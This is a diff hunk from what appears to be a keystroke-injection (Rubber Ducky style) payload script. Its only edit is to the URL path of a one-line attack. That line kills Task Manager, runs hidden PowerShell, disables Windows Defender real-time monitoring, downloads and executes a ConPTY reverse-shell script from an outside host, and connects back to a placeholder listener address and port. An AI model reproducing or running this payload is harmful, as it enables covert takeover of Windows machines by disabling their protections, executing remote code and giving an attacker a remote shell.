@@ -26,4 +26,4 @@ REM --> Run
 ENTER
 DELAY 500
 REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
-STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://ps1.soggycow.com/Remote%20Access/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]");
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]");
